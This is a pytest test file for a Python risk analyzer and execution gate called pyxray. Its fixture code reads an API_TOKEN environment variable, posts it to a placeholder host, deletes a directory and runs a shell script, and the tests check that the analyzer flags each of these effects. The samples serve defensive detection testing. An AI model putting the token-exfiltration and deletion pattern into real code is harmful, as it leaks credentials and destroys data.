"""End-to-end checks for the Python surface.

Runs under pytest, and standalone under plain `python3` so the Makefile works
without a test dependency.
"""

from __future__ import annotations

import os
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import pyxray
from pyxray.heredoc import extract_python

SKETCHY = """
import os, shutil, subprocess
import requests

TOKEN = os.environ["API_TOKEN"]
shutil.rmtree("/tmp/stage", ignore_errors=True)
r = requests.post("https://h/", json={"t": TOKEN})
subprocess.run("bash go.sh", shell=True)
"""


def test_backend_is_available():
    assert pyxray.backend() in ("extension", "binary")


def test_analyze_reports_the_chain():
    report = pyxray.analyze(SKETCHY, "sketchy.py")
    kinds = {hit["effect"] for hit in report["effects"]}
    assert {"env", "fs_delete", "net", "process"} <= kinds, kinds
    assert report["metrics"]["risk"] > 60
    assert "DELETES" in report["meta"]["synopsis"]


def test_broken_source_still_reports():
    report = pyxray.analyze("def f(:\n", "broken.py")
    assert report["meta"]["parsed"] is False
    assert report["diagnostics"]


def test_render_formats_differ_but_all_carry_the_finding():
    for fmt, marker in (("text", "rmtree"), ("html", "<pre"), ("svg", "<svg")):
        out = pyxray.render(SKETCHY, format=fmt, width=100, layout="card")
        assert marker in out, fmt


def test_ansi_render_contains_escapes():
    out = pyxray.render(SKETCHY, format="ansi", width=90)
    assert "\x1b[" in out


def test_every_theme_and_layout_renders():
    for theme, _, _ in pyxray.themes():
        for layout, _ in pyxray.layouts():
            out = pyxray.render(SKETCHY, theme=theme, layout=layout, format="text", width=90)
            assert out.strip()


def test_heredoc_extraction_matches_the_rust_side():
    cases = [
        ("python3 <<'EOF'\nprint(1)\nEOF\n", "print(1)\n"),
        ('python3 <<"PY"\nx = 2\nPY\n', "x = 2\n"),
        ("python3 <<-END\nprint(3)\n\tEND\n", "print(3)\n"),
        ("python3 -c 'print(4)'", "print(4)"),
        ("print('bare')\n", "print('bare')\n"),
    ]
    for command, expected in cases:
        assert extract_python(command)[0] == expected, command
        if pyxray.backend() == "extension":
            assert pyxray.extract(command)[0] == expected, command


def test_interceptor_gate_refuses_and_reports_why():
    env = {**os.environ, "PYXRAY_GATE": "10", "PYXRAY_WIDTH": "80",
           "PYTHONPATH": str(Path(__file__).resolve().parents[1])}
    script = Path(__file__).parent / "_sample.py"
    script.write_text("import shutil\nshutil.rmtree('/tmp/nope')\n")
    try:
        proc = subprocess.run(
            [sys.executable, "-m", "pyxray.intercept", "--", sys.executable, str(script)],
            capture_output=True, text=True, env=env,
        )
        assert proc.returncode == 3, proc.stderr
        assert "refusing to run" in proc.stderr
    finally:
        script.unlink(missing_ok=True)


def test_interceptor_runs_harmless_code():
    env = {**os.environ, "PYXRAY_GATE": "50", "PYXRAY_WIDTH": "80",
           "PYTHONPATH": str(Path(__file__).resolve().parents[1])}
    proc = subprocess.run(
        [sys.executable, "-m", "pyxray.intercept", "--",
         sys.executable, "-c", "print('ran')"],
        capture_output=True, text=True, env=env,
    )
    assert proc.returncode == 0, proc.stderr
    assert "ran" in proc.stdout


if __name__ == "__main__":
    failures = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn()
                print(f"ok    {name}")
            except AssertionError as exc:
                failures += 1
                print(f"FAIL  {name}: {exc}")
    print(f"\n{failures} failure(s)")
    raise SystemExit(1 if failures else 0)
